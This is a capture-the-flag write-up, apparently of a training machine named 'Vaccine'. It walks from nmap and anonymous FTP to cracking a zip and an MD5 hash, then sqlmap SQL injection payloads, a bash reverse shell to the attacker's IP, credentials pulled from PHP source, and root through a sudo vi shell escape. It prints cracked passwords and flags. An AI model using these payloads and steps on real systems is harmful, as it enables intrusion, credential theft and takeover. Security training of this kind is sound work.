# Vaccine Write-up

#Vulnerability Assessment
#Databases
#Custom Applications
#Protocols
#Source Code Analysis
#Apache
#PostgreSQL
#FTP
#PHP
#Reconnaissance
#Password Cracking
#SUDO Exploitation
#SQL Injection
#Remote Code Execution
#Clear Text Credentials
#Anonymous/Guest Access

## Introduction

## Enumeration
1. **Scan with Nmap**:
    - `nmap -sV -sC {TARGET_IP}`
    - Open ports:
        ```
        nmap -sV -sC 10.129.185.253
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 03:56 EDT
        Nmap scan report for 10.129.185.253
        Host is up (0.098s latency).
        Not shown: 997 closed tcp ports (reset)
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 3.0.3
        | ftp-syst: 
        |   STAT: 
        | FTP server status:
        |      Connected to ::ffff:10.10.15.106
        |      Logged in as ftpuser
        |      TYPE: ASCII
        |      No session bandwidth limit
        |      Session timeout in seconds is 300
        |      Control connection is plain text
        |      Data connections will be plain text
        |      At session startup, client count was 2
        |      vsFTPd 3.0.3 - secure, fast, stable
        |_End of status
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
        |_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
        22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
        |   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
        |_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        |_http-title: MegaCorp Login
        | http-cookie-flags: 
        |   /: 
        |     PHPSESSID: 
        |_      httponly flag not set
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 11.93 seconds
        ```

2. **GoBuster**:
    - `gobuster dir --url {URL} --wordlist /opt/SecList/Discovery/Web-content/common.txt`
    - result: No interesting information.

3. **Navigate the Website**:
    - Found only a login page.

## Connect to FTP Anonymous
- `ftp {TARGET_IP}`
- `get backup.zip`

## Crack Password
1. **Crack Password to retrive content zip**:
- Use tools like `zip2john` and `john` to crack the password and access the content.

```
    # Generate hash from zip file
    zip2john backup.zip > backup.hash

    # Crack the password using a custom wordlist
    john --wordlist=/path/to/wordlist.txt backup.hash

    # Check the cracked password
    john --show backup.hash
```

- Display containt unzip 
- `cat index.php` and we find login and password admin
- username: admin, password: 2cb42f8734ea607eefed3b70af13bbd3

2. **Crack password admin**
- use tool `jonh`
```
    echo 'admin:2cb42f8734ea607eefed3b70af13bbd3' > hash.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
    john --show --format=Raw-MD5 hash.txt 
    
```
- Why md5 ? because associated with an MD5 hash of a password in the provided PHP code
- admin:qwerty789

## In page dashbord.php
- use tool `sqlmap`
- `sqlmap -u "http://10.129.185.253/dashboard.php?search=1" --cookie="PHPSESSID=your-session-id" --level=5 --risk=3 --dbs`
- differentes playloads
```
sqlmap identified the following injection point(s) with a total of 155 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: search=-7550' OR 7976=7976-- Qmgm

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=1' AND 1016=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (1016=1016) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(122)||CHR(113)||CHR(113)) AS NUMERIC)-- fxHD

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=1';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=1' AND 5144=(SELECT 5144 FROM PG_SLEEP(5))-- QOaj

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=1' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(107)||CHR(122)||CHR(113)||CHR(113))||(CHR(119)||CHR(78)||CHR(81)||CHR(104)||CHR(121)||CHR(76)||CHR(74)||CHR(101)||CHR(99)||CHR(107)||CHR(102)||CHR(68)||CHR(78)||CHR(97)||CHR(97)||CHR(101)||CHR(84)||CHR(90)||CHR(121)||CHR(105)||CHR(105)||CHR(69)||CHR(119)||CHR(69)||CHR(65)||CHR(112)||CHR(87)||CHR(74)||CHR(113)||CHR(118)||CHR(85)||CHR(88)||CHR(100)||CHR(111)||CHR(106)||CHR(71)||CHR(87)||CHR(70)||CHR(69)||CHR(105))||(CHR(113)||CHR(120)||CHR(122)||CHR(113)||CHR(113)),NULL-- chrG
```

The last playload we get things interesting, when we put in the url : `http://10.129.185.253/dashboard.php?search=search=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,(CHR(113)||CHR(107)||CHR(122)||CHR(113)||CHR(113))||(CHR(119)||CHR(78)||CHR(81)||CHR(104)||CHR(121)||CHR(76)||CHR(74)||CHR(101)||CHR(99)||CHR(107)||CHR(102)||CHR(68)||CHR(78)||CHR(97)||CHR(97)||CHR(101)||CHR(84)||CHR(90)||CHR(121)||CHR(105)||CHR(105)||CHR(69)||CHR(119)||CHR(69)||CHR(65)||CHR(112)||CHR(87)||CHR(74)||CHR(113)||CHR(118)||CHR(85)||CHR(88)||CHR(100)||CHR(111)||CHR(106)||CHR(71)||CHR(87)||CHR(70)||CHR(69)||CHR(105))||(CHR(113)||CHR(120)||CHR(122)||CHR(113)||CHR(113)),NULL--%20chrG`

we have : qkzqqwNQhyLJeckfDNaaeTZyiiEwEApWJqvUXdojGWFEiqxzqq     i don't yet know utility

- also there are table
```
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

- user other command `sqlmap -u "http://10.129.185.253/dashboard.php?search=1" --cookie="PHPSESSID=your-session-id" --level=5 --risk=3 --os-shell`
- --os-shell : allows you to attempt to obtain an operating system shell on the vulnerable target

launch netcat : nc -lvnp 443

We have a shell and we use a payloads : `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`

```
postgres@vaccine:/var/lib/postgresql/11/main$ whoami
whoami
postgres
```

## Privilege Escalation

- see /var/www/html 
- when we cat file index.php, we find pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

1. **Connect to ssh with postgres**:
- `ssh postgres@10.129.185.253`

- flag user : ec9b13ca4d6229cd5cc1e09980965bf7

2. **sudo -l**:
- when we try to do `sudo -l` and we enter a password we obtain : 
```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET",
    env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

the sudo privilege given to the postgres user to edit the pg_hba.conf file with vi introduces a vulnerability that could be exploited to gain root access to the system

- `sudo vi /etc/postgresql/11/main/pg_hba.conf`
- Escape to a shell:

Within vi, press the Esc key to make sure you are in command mode.
Type `:!sh` and press Enter.
This command escapes to a shell with the same privileges that vi was executed with, which in this case, are root privileges.

- `whoami`

```
# whoami
root
```
flag root : dd6e058e814260bc70e9bbdef2715849